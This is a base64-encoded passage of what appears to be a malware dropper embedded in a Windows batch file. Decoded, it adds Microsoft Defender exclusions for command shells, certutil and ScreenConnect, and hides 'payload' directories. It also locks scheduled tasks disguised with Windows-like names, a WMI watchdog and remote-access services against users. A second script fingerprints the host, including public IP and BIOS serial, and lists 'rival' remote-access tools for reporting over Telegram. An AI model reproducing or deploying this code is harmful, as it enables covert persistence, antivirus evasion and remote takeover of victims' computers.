YmplY3QgLVVuaXF1ZSkpeyBpZigkcCAtYW5kIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRwKSl7
IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHAgLUVBIDAgfSB9OyIgXg0KICAiZm9y
ZWFjaCgkeCBpbiBAKCdtc2lleGVjLmV4ZScsJ2N1cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hl
bGwuZXhlJywnY2VydHV0aWwuZXhlJywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScs
J1NjcmVlbkNvbm5lY3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4
Y2x1c2lvblByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1
c2lvbkV4dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIgPm51bCAyPiYxDQoNClJF
TSAtLS0gQUNMOiBvbmx5IFNZU1RFTSArIEFkbWluaXN0cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAt
LS0NCmNhbGwgOkxvY2tEaXIgIiVXRCUiDQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0t
LSBoaWRlIHdvcmtkaXJzICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVX
RCUiID5udWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpSRU0gUzU6IGRv
IE5PVCBoaWRlL2xvY2sgdGhlIG11dGFibGUgcGF5bG9hZCBzY3JpcHRzIC0gY29weS9tb3ZlIG92
ZXIgK2ggK3MgZmlsZXMNClJFTSBmYWlscyBzaWxlbnRseSBhbmQgZnJvemUgdGhlIHdob2xlIGZs
ZWV0J3Mgc2VsZi11cGRhdGUuIEhpZGRlbiBkaXJzIGNvbmNlYWwgY29udGVudHMgYWxyZWFkeS4N
CmZvciAlJUYgaW4gKHBrZy5tc2kgbm90aWZ5LmNmZyBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikg
ZG8gKA0KICBpZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwg
Mj4mMQ0KKQ0KDQpSRU0gLS0tIEFDTDogc2NoZWR1bGVkIHRhc2sgWE1MIChoYXJkZXIgdG8gZGVs
ZXRlIHdpdGhvdXQgQWRtaW4pIC0tLQ0KUkVNIFM2OiBuYW1lcyBjb250YWluIHNwYWNlcyAoIlNl
cnZlciBEaWFnbm9zdGljcyIpIC0gdGhlIGNtZCBGT1IgbG9vcCBzcGxpdA0KUkVNIHRoZW0gaW50
byBnYXJiYWdlIHRva2Vucy4gUG93ZXJTaGVsbCByZWFkcyBpZGVudGl0eS5jZmcgZGlyZWN0bHkg
aW5zdGVhZC4NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVj
dXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZlcmVuY2U9
J1NpbGVudGx5Q29udGludWUnOyAkbmFtZXM9QCgpOyIgXg0KICAiaWYoVGVzdC1QYXRoIC1MaXRl
cmFsUGF0aCAnJVdEJVxpZGVudGl0eS5jZmcnKXsgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICcl
V0QlXGlkZW50aXR5LmNmZycgLUZvcmNlIHwgRm9yRWFjaC1PYmplY3QgeyBpZigkXyAtbWF0Y2gg
J15UQVNLX1tBLURdPSguKykkJyl7ICRuYW1lcyArPSAkbWF0Y2hlc1sxXS5UcmltKCkuVHJpbVN0
YXJ0KCdcJykgfSB9IH0iIF4NCiAgImVsc2UgeyAkbmFtZXM9QCgnV2VyUXVldWVTeW5jJywnUGxh
U2VydmVySGVhbHRoJywnV2RpSG9zdFByb3h5JywnVGNwSXBDb25mbGljdFJlcycpIH07IiBeDQog
ICJmb3JlYWNoKCRuIGluICRuYW1lcyl7ICRmID0gSm9pbi1QYXRoICclVEFTS1JPT1QlJyAkbjsg
aWYoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZil7ICYgaWNhY2xzLmV4ZSAkZiAvaW5oZXJpdGFu
Y2U6ciB8IE91dC1OdWxsOyAmIGljYWNscy5leGUgJGYgL2dyYW50OnIgJ05UIEFVVEhPUklUWVxT
WVNURU06RicgJ0JVSUxUSU5cQWRtaW5pc3RyYXRvcnM6RicgfCBPdXQtTnVsbDsgJiBhdHRyaWIu
ZXhlICtoICtzICRmIHwgT3V0LU51bGwgfSB9IiA+bnVsIDI+JjENCg0KUkVNIC0tLSBBQ0w6IFdN
SSB3YXRjaGRvZyBzdWJzY3JpcHRpb24gZmlsZXMgKGNoYWluIDIpIC0tLQ0KaWNhY2xzICIlU3lz
dGVtUm9vdCVcU3lzdGVtMzJcd2JlbVxSZXBvc2l0b3J5IiAvZ3JhbnQgIk5UIEFVVEhPUklUWVxT
WVNURU06RiIgPm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBrZWVwIFNjcmVlbkNvbm5lY3QgaW5z
dGFsbCBkaXJzIChvbmNlOyB0YWtlb3duIGV2ZXJ5IHRpY2sgaXMgbm9pc3kpIC0tLQ0KaWYgbm90
IGV4aXN0ICIlV0QlXHNlY3VyZV9zYy5mbGFnIiAoDQogIGZvciAlJUQgaW4gKA0KICAgICIlUEYl
XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSINCiAgICAiJVBGJVxTY3JlZW5Db25uZWN0
IENsaWVudCAoJUtFRVAyJSkiDQogICAgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtF
RVAxJSkiDQogICAgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQogICkg
ZG8gKA0KICAgIGlmIGV4aXN0ICIlJX5EIiBjYWxsIDpMb2NrRGlyICIlJX5EIg0KICApDQogIGVj
aG8gc2NfbG9ja2VkPiVXRCVcc2VjdXJlX3NjLmZsYWcNCikNCg0KUkVNIC0tLSBTQyBzZXJ2aWNl
czogU1lTVEVNIGNhbiBjb25maWcvc3RvcC9kZWxldGU7IEJBIGZ1bGw7IHVzZXJzIGJsb2NrZWQg
LS0tDQpSRU0gU1k6IENDIERDIExDIFNXIFJQIERUIExPIFJDICAobm8gU0QgLT4gY2Fubm90IGNo
YW5nZSB0aGlzIFNEIGl0c2VsZikNCnNldCAiU0Q9RDooQTs7Q0NEQ0xDU1dSUFdQRFRMT0NSUkM7
OztTWSkoQTs7Q0NEQ0xDU1dSUFdQRFRMT0NSU0RSQ1dEV087OztCQSkiDQpzYy5leGUgc2RzZXQg
IiVQUklNJSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlQUxUJSIgIiVTRCUiID5u
dWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJVBSSU0lIiBzdGFydD0gYXV0byA+bnVsIDI+JjENCnNj
LmV4ZSBjb25maWcgIiVBTFQlIiBzdGFydD0gYXV0byA+bnVsIDI+JjENCnNjLmV4ZSBmYWlsdXJl
ICIlUFJJTSUiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAw
MDAvcmVzdGFydC82MDAwMCA+bnVsIDI+JjENCnNjLmV4ZSBmYWlsdXJlICIlQUxUJSIgcmVzZXQ9
IDg2NDAwIGFjdGlvbnM9IHJlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAw
ID5udWwgMj4mMQ0KDQplY2hvIHNlY3VyZV9kb25lPj4iJUxPRyUiDQpleGl0IC9iIDANCg0KOkxv
Y2tEaXINCnNldCAiVD0lfjEiDQppZiBub3QgZXhpc3QgIiVUJSIgZXhpdCAvYiAwDQpSRU0gdGFr
ZSBvd25lcnNoaXAgdGhlbiBzdHJpcCBpbmhlcml0ZWQgQUNFczsgU1lTVEVNK0FkbWlucyBvbmx5
DQp0YWtlb3duIC9GICIlVCUiIC9SIC9EIFkgPm51bCAyPiYxDQppY2FjbHMgIiVUJSIgL2luaGVy
aXRhbmNlOnIgPm51bCAyPiYxDQppY2FjbHMgIiVUJSIgL2dyYW50OnIgIk5UIEFVVEhPUklUWVxT
WVNURU06KE9JKShDSSlGIiAiQlVJTFRJTlxBZG1pbmlzdHJhdG9yczooT0kpKENJKUYiID5udWwg
Mj4mMQ0KaWNhY2xzICIlVCUiIC9yZW1vdmU6ZyAiVXNlcnMiICJBdXRoZW50aWNhdGVkIFVzZXJz
IiAiRXZlcnlvbmUiICJOVCBBVVRIT1JJVFlcSU5URVJBQ1RJVkUiICJCVUlMVElOXFVzZXJzIiA+
bnVsIDI+JjENCmV4aXQgL2IgMA0K
::B64_SEC_END
::B64_TGR_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIFRHX1JFUE9SVCBCVUlMRCAyMDI2MDgwMlQxNCAtIHJv
b3QtbGV2ZWwgdGFzayBuYW1lcyAoSURFTlRWRVI9Nyk7IFRSIG93bmVyc2hpcDsgUk1NK0RhdHRv
IGtlZXAKcGFyYW0oCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV1bc3RyaW5nXSRT
dGF0ZSwKICAgIFtzdHJpbmddJFN1bW1hcnkgPSAnJywKICAgIFtzdHJpbmddJFdvcmtEaXIgPSAn
QzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUnLAogICAg
W3N0cmluZ10kT2xkU3RhdGUgPSAnJywKICAgIFtWYWxpZGF0ZVNldCgncmljaCcsICdjb21wYWN0
JyldW3N0cmluZ10kTW9kZSA9ICdyaWNoJywKICAgIFtzdHJpbmddJEJ1aWxkID0gJ08xNScsCiAg
ICBbc3RyaW5nXSRDb3VudCA9ICcwJwopCgokRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVu
dGx5Q29udGludWUnCiRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScKdHJ5
IHsgW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2Vj
dXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMiB9IGNhdGNoIHt9CgpmdW5jdGlvbiBHZXQtQ2ZnIHsK
ICAgICRwYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdub3RpZnkuY2ZnJwogICAgJGNmZyA9IEB7
fQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcGF0aCkpIHsgcmV0dXJuICRjZmcgfQogICAgR2V0
LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRwYXRoIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgIGlm
ICgkXyAtbWF0Y2ggJ15ccyooW0EtWmEtejAtOV9dKylccyo9XHMqKC4qKVxzKiQnKSB7CiAgICAg
ICAgICAgICRjZmdbJG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0uVHJpbSgpCiAgICAgICAgfQog
ICAgfQogICAgcmV0dXJuICRjZmcKfQoKZnVuY3Rpb24gRXNjKFtzdHJpbmddJHMpIHsKICAgIGlm
ICgkbnVsbCAtZXEgJHMpIHsgcmV0dXJuICcnIH0KICAgIHJldHVybiAoJHMgLXJlcGxhY2UgJyYn
LCAnJmFtcDsnIC1yZXBsYWNlICc8JywgJyZsdDsnIC1yZXBsYWNlICc+JywgJyZndDsnKQp9Cgpm
dW5jdGlvbiBHZXQtUHVibGljSXAgewogICAgZm9yZWFjaCAoJHUgaW4gQCgKICAgICAgICAgICAg
J2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycsCiAgICAgICAgICAgICdodHRwczovL2lmY29uZmlnLm1l
L2lwJywKICAgICAgICAgICAgJ2h0dHBzOi8vaWNhbmhhemlwLmNvbScKICAgICAgICApKSB7CiAg
ICAgICAgdHJ5IHsKICAgICAgICAgICAgJHIgPSBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1IC1V
c2VCYXNpY1BhcnNpbmcgLVRpbWVvdXRTZWMgNgogICAgICAgICAgICAkaXAgPSAoJHIuQ29udGVu
dCB8IE91dC1TdHJpbmcpLlRyaW0oKQogICAgICAgICAgICBpZiAoJGlwIC1tYXRjaCAnXlxkezEs
M30oXC5cZHsxLDN9KXszfSQnIC1vciAkaXAgLW1hdGNoICc6JykgeyByZXR1cm4gJGlwIH0KICAg
ICAgICB9IGNhdGNoIHt9CiAgICB9CiAgICByZXR1cm4gJ24vYScKfQoKZnVuY3Rpb24gR2V0LUxv
Y2FsSXBzIHsKICAgIHRyeSB7CiAgICAgICAgJGlwcyA9IEdldC1OZXRJUEFkZHJlc3MgLUFkZHJl
c3NGYW1pbHkgSVB2NCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgICAg
IFdoZXJlLU9iamVjdCB7ICRfLklQQWRkcmVzcyAtbm90bGlrZSAnMTI3LionIC1hbmQgJF8uUHJl
Zml4T3JpZ2luIC1uZSAnV2VsbEtub3duJyB9IHwKICAgICAgICAgICAgU2VsZWN0LU9iamVjdCAt
RXhwYW5kUHJvcGVydHkgSVBBZGRyZXNzIC1VbmlxdWUKICAgICAgICBpZiAoJGlwcykgeyByZXR1
cm4gKCRpcHMgLWpvaW4gJywgJykgfQogICAgfSBjYXRjaCB7fQogICAgdHJ5IHsKICAgICAgICAk
aXBzID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlvbiAt
RmlsdGVyICdJUEVuYWJsZWQ9VHJ1ZScgfAogICAgICAgICAgICBGb3JFYWNoLU9iamVjdCB7ICRf
LklQQWRkcmVzcyB9IHwgV2hlcmUtT2JqZWN0IHsgJF8gLWFuZCAkXyAtbm90bGlrZSAnMTI3Lion
IC1hbmQgJF8gLW5vdGxpa2UgJyo6KicgfQogICAgICAgIGlmICgkaXBzKSB7IHJldHVybiAoKCRp
cHMgfCBTZWxlY3QtT2JqZWN0IC1VbmlxdWUpIC1qb2luICcsICcpIH0KICAgIH0gY2F0Y2gge30K
ICAgIHJldHVybiAnbi9hJwp9CgpmdW5jdGlvbiBHZXQtT3NJbmZvIHsKICAgICRvID0gW29yZGVy
ZWRdQHsKICAgICAgICBDYXB0aW9uID0gJ24vYSc7IFZlcnNpb24gPSAnbi9hJzsgQnVpbGQgPSAn
bi9hJzsgQXJjaCA9ICduL2EnCiAgICAgICAgRG9tYWluID0gJ24vYSc7IEluc3RhbGxEYXRlID0g
J24vYSc7IExhc3RCb290ID0gJ24vYScKICAgICAgICBDUFUgPSAnbi9hJzsgTWFudWZhY3R1cmVy
ID0gJ24vYSc7IE1vZGVsID0gJ24vYSc7IFNlcmlhbCA9ICduL2EnCiAgICAgICAgVG90YWxSQU1f
R0IgPSAnbi9hJzsgRGlza0ZyZWVfR0IgPSAnbi9hJzsgRGlza1NpemVfR0IgPSAnbi9hJwogICAg
fQogICAgdHJ5IHsKICAgICAgICAkb3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfT3BlcmF0aW5n
U3lzdGVtCiAgICAgICAgJG8uQ2FwdGlvbiA9ICRvcy5DYXB0aW9uCiAgICAgICAgJG8uVmVyc2lv
biA9ICRvcy5WZXJzaW9uCiAgICAgICAgJG8uQnVpbGQgPSAkb3MuQnVpbGROdW1iZXIKICAgICAg
ICAkby5BcmNoID0gJG9zLk9TQXJjaGl0ZWN0dXJlCiAgICAgICAgJG8uSW5zdGFsbERhdGUgPSAo
JG9zLkluc3RhbGxEYXRlIHwgR2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCcpCiAgICAgICAg
JG8uTGFzdEJvb3QgPSAoJG9zLkxhc3RCb290VXBUaW1lIHwgR2V0LURhdGUgLUZvcm1hdCAneXl5
eS1NTS1kZCBISDptbScpCiAgICAgICAgJG8uVG90YWxSQU1fR0IgPSBbbWF0aF06OlJvdW5kKCRv
cy5Ub3RhbFZpc2libGVNZW1vcnlTaXplIC8gMU1CLCAxKQogICAgfSBjYXRjaCB7fQogICAgdHJ5
IHsKICAgICAgICAkY3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfQ29tcHV0ZXJTeXN0ZW0KICAg
ICAgICAkby5Eb21haW4gPSBpZiAoJGNzLlBhcnRPZkRvbWFpbikgeyAkY3MuRG9tYWluIH0gZWxz
ZSB7ICRjcy5Xb3JrZ3JvdXAgfQogICAgICAgICRvLk1hbnVmYWN0dXJlciA9ICRjcy5NYW51ZmFj
dHVyZXIKICAgICAgICAkby5Nb2RlbCA9ICRjcy5Nb2RlbAogICAgfSBjYXRjaCB7fQogICAgdHJ5
IHsKICAgICAgICAkby5DUFUgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3NvciB8IFNl
bGVjdC1PYmplY3QgLUZpcnN0IDEgLUV4cGFuZFByb3BlcnR5IE5hbWUpCiAgICB9IGNhdGNoIHt9
CiAgICB0cnkgewogICAgICAgICRvLlNlcmlhbCA9IChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfQklP
UykuU2VyaWFsTnVtYmVyCiAgICB9IGNhdGNoIHt9CiAgICB0cnkgewogICAgICAgICRkID0gR2V0
LUNpbUluc3RhbmNlIFdpbjMyX0xvZ2ljYWxEaXNrIC1GaWx0ZXIgIkRldmljZUlEPSdDOiciCiAg
ICAgICAgJG8uRGlza0ZyZWVfR0IgPSBbbWF0aF06OlJvdW5kKCRkLkZyZWVTcGFjZSAvIDFHQiwg
MSkKICAgICAgICAkby5EaXNrU2l6ZV9HQiA9IFttYXRoXTo6Um91bmQoJGQuU2l6ZSAvIDFHQiwg
MSkKICAgIH0gY2F0Y2gge30KICAgIHJldHVybiAkbwp9CgpmdW5jdGlvbiBHZXQtU3ZjTGluZShb
c3RyaW5nXSRuYW1lKSB7CiAgICAkcyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFj
dGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJ05PVCBJTlNU
QUxMRUQnIH0KICAgIHJldHVybiAoJ3swfSAoU3RhcnQ9ezF9KScgLWYgJHMuU3RhdHVzLCAkcy5T
dGFydFR5cGUpCn0KCmZ1bmN0aW9uIEdldC1UYXNrSGVhbHRoKFtzdHJpbmddJHRuKSB7CiAgICAk
b3V0ID0gJiBzY2h0YXNrcy5leGUgL1F1ZXJ5IC9UTiAkdG4gL0ZPIExJU1QgL1YgMj4kbnVsbAog
ICAgaWYgKCRMQVNURVhJVENPREUgLW5lIDAgLW9yIC1ub3QgJG91dCkgewogICAgICAgIHJldHVy
biBAeyBQcmVzZW50ID0gJGZhbHNlOyBTdGF0dXMgPSAnTUlTU0lORyc7IE5leHQgPSAnJzsgTGFz
dCA9ICcnOyBSZXN1bHQgPSAnJzsgT3VycyA9ICRmYWxzZSB9CiAgICB9CiAgICAkbWFwID0gQHt9
CiAgICAkYmxvYiA9ICgkb3V0IHwgRm9yRWFjaC1PYmplY3QgeyAiJF8iIH0pIC1qb2luICJgbiIK
ICAgIGZvcmVhY2ggKCRsaW5lIGluICRvdXQpIHsKICAgICAgICBpZiAoJGxpbmUgLW1hdGNoICde
XHMqKFteOl0rKTpccyooLiopXHMqJCcpIHsKICAgICAgICAgICAgJG1hcFskbWF0Y2hlc1sxXS5U
cmltKCldID0gJG1hdGNoZXNbMl0uVHJpbSgpCiAgICAgICAgfQogICAgfQogICAgJHN0YXR1cyA9
ICRtYXBbJ1N0YXR1cyddCiAgICBpZiAoLW5vdCAkc3RhdHVzKSB7ICRzdGF0dXMgPSAkbWFwWydU
YXNrIFN0YXR1cyddIH0KICAgIGlmICgtbm90ICRzdGF0dXMpIHsgJHN0YXR1cyA9ICdwcmVzZW50
JyB9CiAgICAkbmV4dCA9ICRtYXBbJ05leHQgUnVuIFRpbWUnXQogICAgaWYgKC1ub3QgJG5leHQp
IHsgJG5leHQgPSAnJyB9CiAgICAkbGFzdCA9ICRtYXBbJ0xhc3QgUnVuIFRpbWUnXQogICAgaWYg
KC1ub3QgJGxhc3QpIHsgJGxhc3QgPSAnJyB9CiAgICAkcmVzdWx0ID0gJG1hcFsnTGFzdCBSZXN1
bHQnXQogICAgaWYgKC1ub3QgJHJlc3VsdCkgeyAkcmVzdWx0ID0gJycgfQogICAgJHRyID0gJG1h
cFsnVGFzayBUbyBSdW4nXQogICAgaWYgKC1ub3QgJHRyKSB7ICR0ciA9ICRtYXBbJ1Rhc2sgdG8g
UnVuJ10gfQogICAgJG91cnMgPSAoJGJsb2IgLW1hdGNoICcoP2kpb3duX21vblwuY21kfGV0bF9t
b25cLmNtZHxcLnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQogICAgIyBQcmVzZW50IFdpbmRvd3Mg
YnVpbHQtaW4gd2l0aCBzYW1lIG5hbWUgaXMgTk9UIGhlYWx0aHkgZm9yIHVzCiAgICAkaGVhbHRo
eSA9ICRvdXJzIC1hbmQgKCgkc3RhdHVzIC1tYXRjaCAnUmVhZHl8UnVubmluZycpIC1vciAoJHN0
YXR1cyAtZXEgJ3ByZXNlbnQnKSkKICAgIHJldHVybiBAewogICAgICAgIFByZXNlbnQgPSAkdHJ1
ZQogICAgICAgIE91cnMgICAgPSBbYm9vbF0kb3VycwogICAgICAgIEhlYWx0aHkgPSBbYm9vbF0k
aGVhbHRoeQogICAgICAgIFN0YXR1cyAgPSAkKGlmICgkb3VycykgeyAkc3RhdHVzIH0gZWxzZSB7
ICdOT1RfT1VSUycgfSkKICAgICAgICBOZXh0ICAgID0gJG5leHQKICAgICAgICBMYXN0ICAgID0g
JGxhc3QKICAgICAgICBSZXN1bHQgID0gJHJlc3VsdAogICAgICAgIFRyICAgICAgPSAkKGlmICgk
dHIpIHsgJHRyIH0gZWxzZSB7ICcnIH0pCiAgICB9Cn0KCmZ1bmN0aW9uIEdldC1SbW1IaXRzIHsK
ICAgICMgRGV0ZWN0IHJpdmFscyBmb3IgVGVsZWdyYW0uIEtFRVA6IFNjcmVlbkNvbm5lY3QgYWxs
b3dsaXN0ICsgRGF0dG8vQ2VudHJhU3RhZ2UuCiAgICAkdG9rZW5zID0gQCgKICAgICAgICAnQW55
RGVzaycsICdUZWFtVmlld2VyJywgJ3R2bnNlcnZlcicsICdEV0FnZW50JywgJ0RXU2VydmljZScs
ICdMb2dNZUluJywgJ0xNSUd1YXJkaWFuJywKICAgICAgICAnV2luVk5DJywgJ3ZuY3NlcnZlcics
ICd0dl8nLCAnU3BsYXNodG9wJywgJ1pvaG8gQXNzaXN0JywgJ1J1c3REZXNrJywgJ1JlbW90ZVBD
JywgJ0RhbWVXYXJlJywKICAgICAgICAnQXRlcmFBZ2VudCcsICdBdGVyYScsICdOaW5qYVJNTScs
ICdOaW5qYU9uZScsICdOaW5qYVJNTUFnZW50JywgJ0thc2V5YScsICdBZ2VudE1vbicsICdQdWxz
ZXdheScsICdQQyBNb25pdG9yJywgJ1N5bmNybycsICdLYWJ1dG8nLAogICAgICAgICdTdXBlck9w
cycsICdNYW5hZ2VFbmdpbmUnLCAnVUVNUycsICdEZXNrdG9wIENlbnRyYWwnLCAnRW5kcG9pbnQg
Q2VudHJhbCcsICdTb2xhcldpbmRzIE1TUCcsICdDb25uZWN0V2lzZSBBdXRvbWF0ZScsICdMVFNl
cnZpY2UnLCAnTGFiVGVjaCcsCiAgICAgICAgJ0FjdGlvbjEnLCAnU2ltcGxlSGVscCcsICdCb21n
YXInLCAnQmV5b25kVHJ1c3QnLCAnTWVzaEFnZW50JywgJ01lc2ggQ2VudHJhbCcsICdNZXNoIEFn
ZW50JywKICAgICAgICAnVGFjdGljYWxSTU0nLCAndGFjdGljYWxybW0nLCAnR2V0U2NyZWVuJywg
J1N1cHJlbW8nLCAncnV0c2VydicsICdyZW1vdGluZ19ob3N0JywKICAgICAgICAnQ2hyb21lIFJl
bW90ZSBEZXNrdG9wJywgJ1BhcnNlYycsICdOZXRTdXBwb3J0JywgJ0xldmVsLmlvJywgJ0xldmVs
IEFnZW50JywKICAgICAgICAnQ29udGludXVtJywgJ1NBQVonLCAnTmF2ZXJpc2snLCAnSW1teUJv
dCcsICdBdXRvbW94JywgJ2FtYWdlbnQnLCAnQWNyb25pcyBDeWJlcicsICdEb21vdHonLCAnQXV2
aWsnLAogICAgICAgICdCYXJyYWN1ZGEgUk1NJywgJ01hbmFnZWQgV29ya3BsYWNlJywgJ0dvdmVy
bGFuJywgJ1BEUSBEZXBsb3knLCAnUERRIEludmVudG9yeScsICdQRFEgQ29ubmVjdCcsCiAgICAg
ICAgJ04tYWJsZScsICdOLWNlbnRyYWwnLCAnTi1zaWdodCcsICdUYWtlIENvbnRyb2wnLCAnQWR2
YW5jZWQgTW9uaXRvcmluZyBBZ2VudCcsICdVbHRyYVZpZXdlcicsICdBZXJvQWRtaW4nLAogICAg
ICAgICdMaXRlTWFuYWdlcicsICdSYWRtaW4nLCAnTm9NYWNoaW5lJywgJ0lwZXJpdXMnLCAnSVNM
IExpZ2h0JywgJ0FtbXl5JywgJ1RpZ2h0Vk5DJywgJ1VsdHJhVk5DJywgJ1JlYWxWTkMnCiAgICAp
CiAgICAka2VlcFRva2VucyA9IEAoJ0RhdHRvJywgJ0NlbnRyYVN0YWdlJywgJ0NhZ1NlcnZpY2Un
LCAnQXV0b3Rhc2tFbmRwb2ludCcpCiAgICAkaGl0cyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxl
Y3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiAgICAkc2VlbiA9IEB7fQoKICAgIGZ1bmN0aW9u
IEFkZC1IaXQoW3N0cmluZ10ka2luZCwgW3N0cmluZ10kbmFtZSkgewogICAgICAgICRrZXkgPSAi
JGtpbmR8JG5hbWUiLlRvTG93ZXJJbnZhcmlhbnQoKQogICAgICAgIGlmICgkc2Vlbi5Db250YWlu
c0tleSgka2V5KSkgeyByZXR1cm4gfQogICAgICAgICRzZWVuWyRrZXldID0gJHRydWUKICAgICAg
ICBbdm9pZF0kaGl0cy5BZGQoKCctIFt7MH1dIDxjb2RlPnsxfTwvY29kZT4nIC1mICRraW5kLCAo
RXNjICRuYW1lKSkpCiAgICB9CiAgICBmdW5jdGlvbiBUZXN0LUtlZXBOYW1lKFtzdHJpbmddJHMp
IHsKICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJGZhbHNlIH0KICAgICAgICBpZiAoJHMg
LWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0dXJuICR0cnVlIH0KICAgICAgICBmb3JlYWNo
ICgkayBpbiAka2VlcFRva2VucykgeyBpZiAoJHMgLWxpa2UgIiokayoiKSB7IHJldHVybiAkdHJ1
ZSB9IH0KICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CgogICAgR2V0LVNlcnZpY2UgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgJG4gPSAk
Xy5OYW1lCiAgICAgICAgJGQgPSAkXy5EaXNwbGF5TmFtZQogICAgICAgIGlmIChUZXN0LUtlZXBO
YW1lICRuIC1vciBUZXN0LUtlZXBOYW1lICRkKSB7CiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAn
KkNlbnRyYVN0YWdlKicgLW9yICRkIC1saWtlICcqRGF0dG8qJyAtb3IgJG4gLWxpa2UgJypDYWdT
ZXJ2aWNlKicpIHsKICAgICAgICAgICAgICAgIEFkZC1IaXQgJ2tlZXAtZGF0dG8nICgiJG4gKCQo
JF8uU3RhdHVzKSkiKQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybgogICAgICAgIH0K
ICAgICAgICBmb3JlYWNoICgkdCBpbiAkdG9rZW5zKSB7CiAgICAgICAgICAgIGlmICgkbiAtbGlr
ZSAiKiR0KiIgLW9yICRkIC1saWtlICIqJHQqIikgewogICAgICAgICAgICAgICAgQWRkLUhpdCAn
c3ZjJyAoIiRuICgkKCRfLlN0YXR1cykpIikKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAg
ICAgIH0KICAgICAgICB9CiAgICB9CgogICAgR2V0LVByb2Nlc3MgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgJG4gPSAkXy5Qcm9jZXNzTmFt
ZQogICAgICAgIGlmIChUZXN0LUtlZXBOYW1lICRuKSB7IHJldHVybiB9CiAgICAgICAgZm9yZWFj
aCAoJHQgaW4gJHRva2VucykgewogICAgICAgICAgICBpZiAoJG4gLWxpa2UgIiokdCoiKSB7CiAg
ICAgICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAkbgogICAgICAgICAgICAgICAgYnJlYWsKICAg
ICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICAkdW5pbnN0ID0gQCgKICAgICAgICAnSEtM
TTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXCon
LAogICAgICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xD
